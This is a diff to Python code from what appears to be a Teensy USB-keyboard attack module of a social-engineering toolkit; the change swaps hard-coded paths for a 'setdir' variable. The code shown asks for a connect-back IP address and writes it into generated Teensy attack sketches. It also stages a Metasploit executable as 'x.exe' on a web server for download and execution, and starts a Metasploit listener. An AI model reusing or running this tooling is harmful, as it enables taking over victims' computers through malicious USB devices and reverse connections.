@@ -42,7 +42,7 @@ for line in apache_check:
 
 
 # grab info from config file
-fileopen=file("src/program_junk/teensy", "r")
+fileopen=file(setdir + "/teensy", "r")
 counter=0
 payload_counter=0
 for line in fileopen:
@@ -61,14 +61,14 @@ if choice != "14":
         ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
         update_options("IPADDR=" + ipaddr)
 
-if not os.path.isfile("src/program_junk/teensy"):
+if not os.path.isfile(setdir + "/teensy"):
     print_error("FATAL:Something went wrong, the Teensy config file was not created.")
     exit_set()
 
 
 def writefile(filename,now):
     fileopen=file("src/teensy/%s" % filename, "r")
-    filewrite=file("reports/teensy_%s.pde" % (now), "w")
+    filewrite=file(setdir + "/reports/teensy_%s.pde" % (now), "w")
     for line in fileopen:
         match=re.search("IPADDR",line)
         if match:
@@ -110,7 +110,7 @@ if choice == "13":
     payload_counter = 0
 
 # save our stuff here
-print bcolors.BLUE + "\n[*] PDE file created. You can get it under 'reports/teensy_%s.pde' " % (now) +bcolors.ENDC
+print bcolors.BLUE + "\n[*] PDE file created. You can get it under '%s/reports/teensy_%s.pde' " % (setdir,now) +bcolors.ENDC
 print bcolors.GREEN + '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' + bcolors.ENDC
 print bcolors.RED + "\n[*] If your running into issues with VMWare Fusion and the start menu, uncheck\nthe 'Enable Key Mapping' under preferences in VMWare" + bcolors.ENDC
 
@@ -118,18 +118,18 @@ pause = raw_input("Press {return} to continue.")
 
 if payload_counter == 1:
     if apache == 0:
-        subprocess.Popen("mkdir src/program_junk/web_clone/;cp src/program_junk/msf.exe src/program_junk/web_clone/x.exe 1> /dev/null 2> /dev/null", shell=True).wait()
+        subprocess.Popen("mkdir %s/web_clone/;cp %s/msf.exe %s/web_clone/x.exe 1> /dev/null 2> /dev/null" % (setdir,setdir,setdir), shell=True).wait()
         if operating_system != "windows":
             child=pexpect.spawn("python src/html/web_server.py")
 
     if apache == 1:
-        subprocess.Popen("cp src/program_junk/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
-    if os.path.isfile("src/program_junk/meta_config"):
+        subprocess.Popen("cp %s/msf.exe %s/x.exe" % (setdir,apache_path), shell=True).wait()
+    if os.path.isfile(setdir + "/meta_config"):
         print bcolors.BLUE + "\n[*] Launching MSF Listener..."
         print bcolors.BLUE + "[*] This may take a few to load MSF..." + bcolors.ENDC
         try:
             if operating_system != "windows":
-                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (msf_path))
+                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/meta_config" % (msf_path,setdir))
                 child1.interact()
         except:
             if operating_system != "windows":
